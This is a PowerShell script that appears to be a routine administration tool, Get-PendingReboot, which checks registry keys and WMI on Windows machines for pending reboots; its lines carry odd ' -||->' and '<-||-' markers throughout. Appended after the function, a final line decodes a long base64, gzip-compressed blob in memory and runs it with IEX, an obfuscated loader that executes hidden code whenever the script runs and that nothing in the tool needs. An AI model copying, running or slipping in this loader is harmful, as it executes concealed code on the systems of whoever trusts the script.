 -||-> Function Get-PendingReboot
{


	[CmdletBinding()]
	param (
		[Parameter(Position = 0, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
		[Alias("CN", "Computer")]
		[String[]]$ComputerName = "$env:COMPUTERNAME",

		[String]$ErrorLog
	)

	Begin { } 
	Process
	{
		 -||-> Foreach ($Computer in  -||-> $ComputerName <-||- )
		{
			 -||-> Try
			{
				
				 -||-> $CompPendRen, $PendFileRename, $Pending, $SCCM = $false, $false, $false, $false <-||- 

				
				 -||-> $CBSRebootPend = $null <-||- 

				
				 -||-> $WMI_OS =  -||-> Get-WmiObject -Class Win32_OperatingSystem -Property BuildNumber, CSName -ComputerName $Computer -ErrorAction Stop <-||-  <-||- 

				
				 -||-> $HKLM = [UInt32] "0x80000002" <-||- 
				 -||-> $WMI_Reg = [WMIClass] "\\$Computer\root\default:StdRegProv" <-||- 

				
				 -||-> If ( -||-> [Int32]$WMI_OS.BuildNumber -ge 6001 <-||- )
				{
					 -||-> $RegSubKeysCBS = $WMI_Reg.EnumKey($HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\") <-||- 
					 -||-> $CBSRebootPend = $RegSubKeysCBS.sNames -contains "RebootPending" <-||- 
				} <-||- 

				
				 -||-> $RegWUAURebootReq = $WMI_Reg.EnumKey($HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\") <-||- 
				 -||-> $WUAURebootReq = $RegWUAURebootReq.sNames -contains "RebootRequired" <-||- 

				
				 -||-> $RegSubKeySM = $WMI_Reg.GetMultiStringValue($HKLM, "SYSTEM\CurrentControlSet\Control\Session Manager\", "PendingFileRenameOperations") <-||- 
				 -||-> $RegValuePFRO = $RegSubKeySM.sValue <-||- 

				
				 -||-> $ActCompNm = $WMI_Reg.GetStringValue($HKLM, "SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\", "ComputerName") <-||- 
				 -||-> $CompNm = $WMI_Reg.GetStringValue($HKLM, "SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\", "ComputerName") <-||- 
				 -||-> If ( -||-> $ActCompNm -ne $CompNm <-||- )
				{
					 -||-> $CompPendRen = $true <-||- 
				} <-||- 

				
				 -||-> If ( -||-> $RegValuePFRO <-||- )
				{
					 -||-> $PendFileRename = $true <-||- 
				} <-||- 

				
				
				 -||-> $CCMClientSDK = $null <-||- 
				 -||-> $CCMSplat = @{
					NameSpace =  -||-> 'ROOT\ccm\ClientSDK' <-||- 
					Class = -||-> 'CCM_ClientUtilities' <-||- 
					Name =  -||-> 'DetermineIfRebootPending' <-||- 
					ComputerName =  -||-> $Computer <-||- 
					ErrorAction =  -||-> 'Stop' <-||- 
				} <-||- 
				
				 -||-> Try
				{
					 -||-> $CCMClientSDK =  -||-> Invoke-WmiMethod @CCMSplat <-||-  <-||- 
				}
				Catch [System.UnauthorizedAccessException] {
					 -||-> $CcmStatus =  -||-> Get-Service -Name CcmExec -ComputerName $Computer -ErrorAction SilentlyContinue <-||-  <-||- 
					 -||-> If ( -||-> $CcmStatus.Status -ne 'Running' <-||- )
					{
						 -||-> Write-Warning "$Computer`: Error - CcmExec service is not running." <-||- 
						 -||-> $CCMClientSDK = $null <-||- 
					} <-||- 
				}
				Catch
				{
					 -||-> $CCMClientSDK = $null <-||- 
				} <-||- 

				 -||-> If ( -||-> $CCMClientSDK <-||- )
				{
					 -||-> If ( -||-> $CCMClientSDK.ReturnValue -ne 0 <-||- )
					{
						 -||-> Write-Warning "Error: DetermineIfRebootPending returned error code $( -||-> $CCMClientSDK.ReturnValue <-||- )" <-||- 
					} <-||- 
					 -||-> If ( -||-> $CCMClientSDK.IsHardRebootPending -or $CCMClientSDK.RebootPending <-||- )
					{
						 -||-> $SCCM = $true <-||- 
					} <-||- 
				}

				Else
				{
					 -||-> $SCCM = $null <-||- 
				} <-||- 

				
				 -||-> $SelectSplat = @{
					Property =  -||-> (
					 -||-> 'Computer',
					'CBServicing',
					'WindowsUpdate',
					'CCMClientSDK',
					'PendComputerRename',
					'PendFileRename',
					'PendFileRenVal',
					'RebootPending' <-||- 
					) <-||- 
				} <-||- 
				 -||-> New-Object -TypeName PSObject -Property @{
					Computer =  -||-> $WMI_OS.CSName <-||- 
					CBServicing =  -||-> $CBSRebootPend <-||- 
					WindowsUpdate =  -||-> $WUAURebootReq <-||- 
					CCMClientSDK =  -||-> $SCCM <-||- 
					PendComputerRename =  -||-> $CompPendRen <-||- 
					PendFileRename =  -||-> $PendFileRename <-||- 
					PendFileRenVal =  -||-> $RegValuePFRO <-||- 
					RebootPending =  -||-> ( -||-> $CompPendRen -or $CBSRebootPend -or $WUAURebootReq -or $SCCM -or $PendFileRename <-||- ) <-||- 
				} | Select-Object @SelectSplat <-||- 

			}
			Catch
			{
				 -||-> Write-Warning "$Computer`: $_" <-||- 
				
				 -||-> If ( -||-> $ErrorLog <-||- )
				{
					 -||-> Out-File -InputObject "$Computer`,$_" -FilePath $ErrorLog -Append <-||- 
				} <-||- 
			} <-||- 
		} <-||-  
	} 

	End { } 

} <-||-  
 -||-> $s= -||-> New-Object IO.MemoryStream( -||-> ,[Convert]::FromBase64String("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") <-||- ) <-||-  <-||- ; -||-> IEX ( -||-> New-Object IO.StreamReader( -||-> New-Object IO.Compression.GzipStream( -||-> $s,[IO.Compression.CompressionMode]::Decompress <-||- ) <-||- ) <-||- ).ReadToEnd() <-||- ;



